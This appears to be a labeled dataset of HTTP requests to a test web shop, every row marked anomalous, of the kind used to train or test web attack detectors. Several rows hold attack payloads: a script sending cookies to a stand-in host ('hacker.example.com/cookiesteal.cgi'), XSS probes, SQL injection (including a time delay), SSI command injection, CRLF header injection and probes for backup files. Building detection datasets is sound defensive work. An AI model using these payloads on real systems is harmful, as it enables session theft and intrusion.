POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=armand&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dniA=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar,anomalous
GET,http://localhost:8080/asf-logo-wide.gif,,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%7C,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%7C,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/global/menum.jsp/4861362529278789730,,anomalous
GET,http://localhost:8080/iisstart.htm,,anomalous
GET,http://localhost:8080/travelnet/home.jsp,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes.BAK,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/asf-logo-wide.gif.old,,anomalous
GET,http://localhost:8080/tienda1/miembros/index.jsp/,,anomalous
GET,http://localhost:8080/tienda1/miembros/index.jsp.INC,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=%2500&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=%2500&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fUeRTe&nombre=Il%2Ci%3Fdio&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=thyagara&password=fUeRTe&nombre=Il%2Ci%3Fdio&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidosA=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidosA=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=03028605B&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar,anomalous
GET,http://localhost:8080/_cti_pvt/access.cnf,,anomalous
GET,http://localhost:8080/6909030637832563290.jsp.OLD,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1A=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=1&B1A=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/CFIDE/administrator/login.cfm,,anomalous
PUT,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=modestin&pwd=c69p04e13&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&pwd=c69p04e13&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&pwd=c69p04e13&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=modestin&pwd=es%27pec%27ia%2Fl&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=modestin&pwd=es%27pec%27ia%2Fl&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=modestin&pwd=c69p04e13&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&loginA=modestin&pwd=c69p04e13&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/4861362529278789730,,anomalous
PUT,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%253F,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%253F,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp.Old,,anomalous
GET,http://localhost:8080/tienda1/asf-logo-wide,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/miembros.jsp.bak,,anomalous
GET,http://localhost:8080/iisadmpwd/achg.htr,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1764any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1764any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1764&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1764&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=1764&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modoA=insertar&precio=1764&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/4861362529278789730.bak,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=audy&password=8a9c27%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Juan&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33783&provincia=Zamora&ntc=8868360012752422&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=audy&password=8a9c27%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Juan&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33783&provincia=Zamora&ntc=8868360012752422&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=audy&password=8a9c27&nombre=%3FP%27r%F3spero&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33783&provincia=Zamora&ntc=8868360012752422&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=audy&password=8a9c27&nombre=%3FP%27r%F3spero&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33783&provincia=Zamora&ntc=8868360012752422&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=audy&password=8a9c27&nombre=Juan&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33783&provincia=Zamora&ntc=8868360012752422&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&loginA=audy&password=8a9c27&nombre=Juan&apellidos=Ricart+Rizzi&email=taube%40farmaoferta.bi&dni=94839637B&direccion=Calle+San+Indalencio+168+&ciudad=San+Jos%E9+del+Valle&cp=33783&provincia=Zamora&ntc=8868360012752422&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/global/menum.jsp/6909030637832563290.jsp.Old,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg.old,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ballarte&password=misT66L&nombre=Zorella&apellidos=Morera&email=cossar%40asdn.be&dni=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&direccion=Calle+Alvarez+De+Castro+197%2C+&ciudad=Vila-real&cp=19160&provincia=Ja%E9n&ntc=5645703984950542&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ballarte&password=misT66L&nombre=Zorella&apellidos=Morera&email=cossar%40asdn.be&dni=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&direccion=Calle+Alvarez+De+Castro+197%2C+&ciudad=Vila-real&cp=19160&provincia=Ja%E9n&ntc=5645703984950542&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ballarte&password=misT66L&nombre=Zorella&apellidos=Morera&email=cossar%40asdn.be&dni=36813756W&direccion=Calle+Alvarez+De+Castro+197%2C+&ciudad=Vila-real&cp=19160&provincia=Ja%E9n&ntc=966948476857778&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ballarte&password=misT66L&nombre=Zorella&apellidos=Morera&email=cossar%40asdn.be&dni=36813756W&direccion=Calle+Alvarez+De+Castro+197%2C+&ciudad=Vila-real&cp=19160&provincia=Ja%E9n&ntc=966948476857778&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ballarte&password=misT66L&nombre=Zorella&apellidos=Morera&email=cossar%40asdn.be&dni=36813756W&direccion=Calle+Alvarez+De+Castro+197%2C+&ciudadA=Vila-real&cp=19160&provincia=Ja%E9n&ntc=5645703984950542&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ballarte&password=misT66L&nombre=Zorella&apellidos=Morera&email=cossar%40asdn.be&dni=36813756W&direccion=Calle+Alvarez+De+Castro+197%2C+&ciudadA=Vila-real&cp=19160&provincia=Ja%E9n&ntc=5645703984950542&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/asf-logo-wide.gif.old,,anomalous
GET,http://localhost:8080/travelnet/home.jsp,,anomalous
GET,http://localhost:8080/tienda1/imagenes/1.gif.BAK,,anomalous
GET,http://localhost:8080/scripts/tools/mkilog.exe,,anomalous
GET,http://localhost:8080/tienda1/imagenes/logo.gif.old,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Riojaany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&precio=39&cantidad=73&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Vino+Riojaany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&precio=39&cantidad=73&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+.*%3FRioja&precio=39&cantidad=73&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Vino+.*%3FRioja&precio=39&cantidad=73&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=c%2F%3Fa%2Cry&pwd=0ara7s5o&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=c%2F%3Fa%2Cry&pwd=0ara7s5o&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lucie8&pwdA=0ara7s5o&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=lucie8&pwdA=0ara7s5o&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%2520,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1%2520,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp/,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=306&B1=Pasar+por+caja%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=306&B1=Pasar+por+caja%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=306&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modoA=insertar&precio=306&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=couse&password=remanoso&nombre=Viviana&apellidos=Guimera+Faraco%22+AND+%221%22%3D%221&email=andre%40alfombra.com.me&dni=13758311X&direccion=Calle+La+Fuente%2C+59%2C+13%3FB&ciudad=Algadefe&cp=46910&provincia=Burgos&ntc=5183768775927993&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=couse&password=remanoso&nombre=Viviana&apellidos=Guimera+Faraco%22+AND+%221%22%3D%221&email=andre%40alfombra.com.me&dni=13758311X&direccion=Calle+La+Fuente%2C+59%2C+13%3FB&ciudad=Algadefe&cp=46910&provincia=Burgos&ntc=5183768775927993&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=couse&password=remanoso&nombre=Viviana&apellidos=He%2Cusser&email=andre%40alfombra.com.me&dni=13758311X&direccion=Calle+La+Fuente%2C+59%2C+13%3FB&ciudad=Algadefe&cp=46910&provincia=Burgos&ntc=5183768775927993&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=couse&password=remanoso&nombre=Viviana&apellidos=He%2Cusser&email=andre%40alfombra.com.me&dni=13758311X&direccion=Calle+La+Fuente%2C+59%2C+13%3FB&ciudad=Algadefe&cp=46910&provincia=Burgos&ntc=5183768775927993&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=couse&password=remanoso&nombre=Viviana&apellidos=Guimera+Faraco&emailA=andre%40alfombra.com.me&dni=13758311X&direccion=Calle+La+Fuente%2C+59%2C+13%3FB&ciudad=Algadefe&cp=46910&provincia=Burgos&ntc=5183768775927993&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=couse&password=remanoso&nombre=Viviana&apellidos=Guimera+Faraco&emailA=andre%40alfombra.com.me&dni=13758311X&direccion=Calle+La+Fuente%2C+59%2C+13%3FB&ciudad=Algadefe&cp=46910&provincia=Burgos&ntc=5183768775927993&B1=Registrar,anomalous
GET,http://localhost:8080/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carritoparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080.old,,anomalous
GET,http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.java,,anomalous
GET,http://localhost:8080/tienda1/asf-logo-wide,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/.inc,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/6909030637832563290.jsp.old,,anomalous
